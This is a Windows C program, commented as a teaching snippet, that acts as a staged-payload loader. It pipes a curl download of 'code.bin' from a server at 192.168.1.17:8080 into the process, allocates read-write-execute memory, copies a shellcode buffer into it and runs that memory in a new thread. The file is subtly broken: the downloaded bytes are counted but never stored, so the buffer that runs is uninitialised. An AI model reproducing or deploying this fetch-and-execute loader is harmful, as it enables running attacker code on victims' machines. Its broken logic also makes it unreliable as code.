#include <stdio.h>
#include <windows.h>

int main(int argc,char *argv[]){	
	
	//this code snippet explains a staged payload.
	
	FILE *fpipe;
	char *cmd = "curl --silent http://192.168.1.17:8080/code.bin"; // change to desired server ip and port number
	char c=0;
	unsigned char shellcode[510]; //you have to specify shellcode size 
	int counter=0;
	
	//execute the curl cmd and pipe the result to fpipe descriptor
	
	if( (fpipe=(FILE*)(_popen(cmd,"r"))) == NULL ){
		perror("[x] popen() failed..\n");
		exit(EXIT_FAILURE);
	}
	
	while(fread(&c,sizeof(c),1,fpipe)){
		//debug
		//printf("%c",c);
		//end debug
		counter=counter + 1;
	}
	printf("\n[+] shellcode size %d bytes\n",counter);
	shellcode[counter];

	//debug
	/*
	for(int i=0; i < sizeof(shellcode); ++i){
		printf("%c",shellcode[i]);
	}
	system("pause");
	*/
	//end debug
	
	
	
	
	//this code snippet explains how shellcode execution works
	void *exec=VirtualAlloc(NULL,sizeof(shellcode),MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
	if (exec == NULL){printf("[x]can't allocate memory, error %ld\n",GetLastError());exit(1);}
	
	RtlMoveMemory(exec,shellcode,sizeof(shellcode));
	//memcpy(exec,shellcode,sizeof(shellcode));	alternative for RtlMoveMemory()
	
	if (CreateThread(NULL,0,(LPTHREAD_START_ROUTINE) exec,NULL,0,NULL) == NULL){printf("[x] THREAD CREATION FAILED, error %ld\n",GetLastError());exit(1);}
	//((void(*)())exec)(); //alternative for CreateThread()
	return 0;
}
